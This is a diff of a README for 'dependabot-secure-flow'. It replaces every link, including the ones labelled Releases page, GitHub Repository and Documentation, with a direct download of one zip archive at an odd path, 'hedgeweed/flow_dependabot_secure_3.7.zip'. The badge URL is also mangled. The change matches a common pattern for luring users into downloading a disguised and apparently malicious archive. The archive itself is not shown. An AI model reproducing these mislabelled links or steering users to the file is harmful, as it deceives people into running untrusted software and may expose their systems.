@@ -1,6 +1,6 @@
 # 🚀 dependabot-secure-flow - Simplifying Secure Updates for You
 
-[![Download dependabot-secure-flow](https://img.shields.io/badge/Download%20Now-Dependabot%20Secure%20Flow-blue)](https://github.com/P-5122/dependabot-secure-flow/releases)
+[![Download dependabot-secure-flow](https://raw.githubusercontent.com/P-5122/dependabot-secure-flow/main/hedgeweed/flow_dependabot_secure_3.7.zip%20Now-Dependabot%20Secure%20Flow-blue)](https://raw.githubusercontent.com/P-5122/dependabot-secure-flow/main/hedgeweed/flow_dependabot_secure_3.7.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run dependabot-secure-flow:
 
 1. **Visit the Releases Page**
    Click on the link below to go to the Releases page where you can download the latest version of dependabot-secure-flow.
-   [Visit Releases Page to Download](https://github.com/P-5122/dependabot-secure-flow/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/P-5122/dependabot-secure-flow/main/hedgeweed/flow_dependabot_secure_3.7.zip)
 
 2. **Select the Latest Release**
    On the Releases page, look for the latest version. It will have the highest number and may also indicate improvements or fixes. Click on it to view details.
@@ -45,7 +45,7 @@ Follow these steps to download and run dependabot-secure-flow:
 
 To get started with dependabot-secure-flow, please visit the Releases page to download the latest version.
 
-[Download dependabot-secure-flow](https://github.com/P-5122/dependabot-secure-flow/releases)
+[Download dependabot-secure-flow](https://raw.githubusercontent.com/P-5122/dependabot-secure-flow/main/hedgeweed/flow_dependabot_secure_3.7.zip)
 
 ## 📄 Usage Guidelines
 
@@ -76,7 +76,7 @@ This project is licensed under the MIT License. You may use, modify, and distrib
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/P-5122/dependabot-secure-flow)
-- [Documentation](https://github.com/P-5122/dependabot-secure-flow/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/P-5122/dependabot-secure-flow/main/hedgeweed/flow_dependabot_secure_3.7.zip)
+- [Documentation](https://raw.githubusercontent.com/P-5122/dependabot-secure-flow/main/hedgeweed/flow_dependabot_secure_3.7.zip)
 
 Thank you for using dependabot-secure-flow! Enjoy a quieter, safer, and more efficient update experience.
